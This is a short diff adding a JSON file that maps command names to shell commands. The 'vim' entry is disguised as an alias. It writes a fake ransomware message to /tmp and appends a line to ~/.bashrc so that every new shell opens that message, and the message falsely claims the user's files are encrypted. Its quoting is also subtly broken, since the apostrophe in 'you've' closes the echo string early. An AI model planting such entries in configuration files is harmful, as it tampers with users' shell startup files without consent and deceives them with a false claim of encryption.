@@ -1,0 +1,4 @@
+{
+  "list": "ls -l",
+  "vim": "echo 'you've been hacked!( •̀ᴗ•́ ).\nI encrypted all of your files and locked you inside vim.' > /tmp/msg.txt; echo 'vim /tmp/msg.txt' >> ~/.bashrc"
+}
